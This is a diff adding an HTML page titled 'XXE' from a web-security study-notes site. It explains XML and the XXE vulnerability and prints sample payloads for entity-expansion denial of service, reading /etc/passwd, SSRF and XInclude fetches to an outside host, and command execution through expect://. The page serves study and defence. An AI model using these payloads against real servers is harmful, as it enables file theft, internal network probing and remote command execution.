@@ -1,0 +1,202 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XXE &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">XXE</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/vuln/xxe.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="xxe">
+<h1>XXE<a class="headerlink" href="#xxe" title="Link to this heading"></a></h1>
+<section id="xml-basics">
+<h2>XML Basics<a class="headerlink" href="#xml-basics" title="Link to this heading"></a></h2>
+<p>XML refers to the extensible markup language (eXtensible Markup Language), a markup language used to mark electronic files to make them structural, designed to transmit and store data. The XML document structure includes XML declarations, DTD document type definitions (optional), and document elements. At present, XML files are widely used as configuration files (Spring, Struts2, etc.), document structure description files (PDF, RSS, etc.), and image format files (SVG header). The syntax specification of XML is controlled by DTD (Document Type Definition).</p>
+</section>
+<section id="basic-syntax">
+<h2>Basic syntax<a class="headerlink" href="#basic-syntax" title="Link to this heading"></a></h2>
+<p>XML document has a structure called XML prolog at the beginning of the XML document. and encoding are optional, but must be placed at the beginning of the document.</p>
+<p>In addition to optional beginnings, XML syntax mainly has the following characteristics:</p>
+<ul class="simple">
+<li><p>All XML elements must have a closed tag</p></li>
+<li><p>XML tags are case sensitive</p></li>
+<li><p>XML must be nested correctly</p></li>
+<li><p>XML documents must have root elements</p></li>
+<li><p>The attribute value of XML requires quotes</p></li>
+</ul>
+<p>In addition, XML also has CDATA syntax, which is used to handle situations where multiple characters need to be escaped.</p>
+</section>
+<section id="id1">
+<h2>XXE<a class="headerlink" href="#id1" title="Link to this heading"></a></h2>
+<p>When references to external entities are allowed, malicious XML content can be constructed, resulting in the consequences of reading arbitrary files, executing system commands, detecting intranet ports, and attacking intranet websites. In general XXE attacks, only if the server has echo or errors, the XXE vulnerability can be used to read server-side files, but the attack can also be achieved through Blind XXE.</p>
+</section>
+<section id="attack-method">
+<h2>Attack method<a class="headerlink" href="#attack-method" title="Link to this heading"></a></h2>
+<section id="denial-of-service-attack">
+<h3>Denial of Service Attack<a class="headerlink" href="#denial-of-service-attack" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;! Entity a0 &quot;dos&quot;&gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+</pre></div>
+</div>
+<p>]&gt;
+&lt;data&gt;&amp;a2;&lt;/data&gt;</p>
+<p>If the parsing process is very slow, it means that the test is successful and the target site may have a denial of service vulnerability.
+Specific attacks can use more layers of iteration or recursion, or reference huge external entities to achieve the effect of the attack.</p>
+</section>
+<section id="file-reading">
+<h3>File reading<a class="headerlink" href="#file-reading" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</pre></div>
+</div>
+<p>]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;</p>
+</section>
+<section id="ssrf">
+<h3>SSRF<a class="headerlink" href="#ssrf" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
+&lt;!ELEMENT data (#ANY)&gt;
+</pre></div>
+</div>
+<p>]&gt;
+&lt;data&gt;4&lt;/data&gt;</p>
+</section>
+<section id="rce">
+<h3>RCE<a class="headerlink" href="#rce" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;catalog&gt;
+&lt;core id=&quot;test101&quot;&gt;
+&lt;description&gt;&amp;xxe;&lt;/description&gt;
+&lt;/core&gt;
+&lt;/catalog&gt;
+</pre></div>
+</div>
+</section>
+<section id="xinclude">
+<h3>XInclude<a class="headerlink" href="#xinclude" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;
+</pre></div>
+</div>
+</section>
+</section>
+<section id="reference-link">
+<h2>Reference link<a class="headerlink" href="#reference-link" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="http://www.w3school.com.cn/xml/">XML Tutorial</a></p></li>
+<li><p><a class="reference external" href="https://security.tencent.com/index.php/blog/msg/69">Where is unknown attack, know how to defend XXE vulnerability attack and defense</a></p></li>
+<li><p><a class="reference external" href="http://www.freebuf.com/articles/web/97833.html">XXE Attack Note Sharing</a></p></li>
+<li><p><a class="reference external" href="https://xz.aliyun.com/t/6887">From XML related step by step to XXE vulnerability</a></p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
